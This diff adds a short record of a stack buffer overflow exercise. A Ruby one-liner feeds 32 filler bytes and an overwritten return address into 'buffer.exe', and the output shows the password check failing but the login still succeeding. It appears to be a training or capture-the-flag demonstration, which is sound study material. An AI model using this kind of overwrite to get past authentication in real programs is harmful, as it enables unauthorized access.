@@ -1,0 +1,8 @@
+ruby -e 'print "a"*32 + "\x60\x14\x40\x00"' | buffer.exe
+enter username:
+Your User Name aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`¶@
+enter password
+
+password error
+Your login is successful.
+the login should be verified for this program to execute.
